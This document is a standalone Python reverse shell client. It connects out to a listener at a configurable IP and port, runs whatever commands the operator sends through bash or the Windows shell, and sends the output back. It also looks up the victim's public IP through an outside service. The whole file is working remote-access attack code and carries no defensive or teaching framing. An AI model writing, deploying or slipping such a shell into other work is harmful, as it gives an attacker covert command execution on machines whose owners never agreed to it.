#!/usr/bin/env python
import os
import platform
import socket
import struct
import subprocess
import urllib.request
import json

IP = "127.0.0.1"
PORT = 4444
ARC = platform.system()

class SendReceive:
    def __init__(self, sock):
        self.sock = sock
    
    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        packed = struct.pack('>I', len(data)) + data
        self.sock.sendall(packed)
    
    def recv(self):
        data = self.recvall(4)
        if not data:
            return b""
        data_len = struct.unpack(">I", data)[0]
        return self.recvall(data_len)
    
    def recvall(self, n):
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame:
                return None
            packet += frame
        return packet

class ReverseShellClient:
    def __init__(self, comm):
        self.comm = comm
        self.current_dir = os.getcwd()
        self.old_dir = ""
        self.alive = True

    def run_command(self, cmd):
        try:
            if os.name == 'nt':  # Windows
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            else:  # Linux
                process = subprocess.Popen(
                    ['/bin/bash', '-c', cmd], 
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            output, error = process.communicate(timeout=15)
            return output + error
        except subprocess.TimeoutExpired:
            process.kill()
            return "Error: Command timed out"
        except Exception as e:
            return f"Error: {e}".encode()
    
    def change_directory(self, path):
        path = path.strip()
        try:
            if not path:
                return f"Current directory: {os.getcwd()}".encode()
            
            if not os.path.isdir(path):
                return f"cd: No such directory: {path}".encode()
            
            self.old_dir = os.getcwd()
            os.chdir(path)
            return f"{os.getcwd()}".encode()
        except Exception as e:
            return f"cd error: {e}".encode()
    
    def get_ip_info(self):
        try:
            lip = str(socket.gethostbyname(socket.gethostname()))
            res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
            data = json.loads(res.read().decode())
            pip = data.get('ip', 'Unknown')
            output = {
                "pip": pip,
                "lip": lip
            }
            return json.dumps(output).encode()
        except Exception as e:
            return f"Error getting IP info: {e}".encode()

    def download_file(self, remote_path):
        return b"download functionality to be implemented later"

    def upload_file(self, local_path):
        return b"upload functionality to be implemented later"
    
    def kill_connection(self):
        """Gracefully terminate the connection"""
        self.alive = False
        self.comm.send(b"Terminating connection...")
        self.comm.sock.close()
        return b""
    
    def handle_connection(self):
        while self.alive:
            try:
                cmd = self.comm.recv().decode().strip()
                print("Received command:", cmd)  
                
                if not cmd:
                    continue
                
                if cmd.startswith("cd "):
                    path = cmd[3:]
                    output = self.change_directory(path)
                elif cmd.lower() == "getip":
                    output = self.get_ip_info()
                elif cmd.lower().startswith("download "):
                    remote_path = cmd[9:].strip()
                    output = self.download_file(remote_path)
                elif cmd.lower().startswith("upload "):
                    local_path = cmd[7:].strip()
                    output = self.upload_file(local_path)
                elif cmd.lower() == "kill":
                    output = self.kill_connection()
                    break
                else:
                    output = self.run_command(cmd)
                
                self.comm.send(output)
            
            except (socket.error, KeyboardInterrupt):
                self.kill_connection()
                break
            except Exception as e:
                self.comm.send(f"Unhandled error: {e}".encode())

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))
        print("Connected to server...")
        
        comm = SendReceive(sock)
        client = ReverseShellClient(comm)
        client.handle_connection()
    
    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

if __name__ == "__main__":
    main()